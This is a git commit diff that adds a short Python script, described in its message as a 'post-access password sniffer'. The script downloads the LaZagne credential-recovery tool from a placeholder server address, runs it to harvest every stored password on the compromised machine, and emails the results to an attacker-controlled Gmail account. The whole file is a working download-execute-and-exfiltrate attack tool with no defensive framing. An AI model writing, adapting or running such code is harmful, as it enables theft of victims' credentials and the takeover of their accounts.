9c255b97367f2c22f829c13fc7b23e7e1a613b3e
CoderMANE321 <deontamwilliams@gmail.com>
2024-09-04 21:56:45 -0400

    added post-access password sniffer

---
+++ download_execute_and_report.py
@@ -0,0 +1,22 @@
+#!/usr/bin/env python
+
+import requests, smtplib, subprocess
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+
+
+def send_mail(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587) # google allows anyone to use their smtp server
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+download("serverIp/file/laZagne.exe")
+result = subprocess.check_output("laZagne.exe all", shell=True)
+send_mail("youremail", "google app password", result)
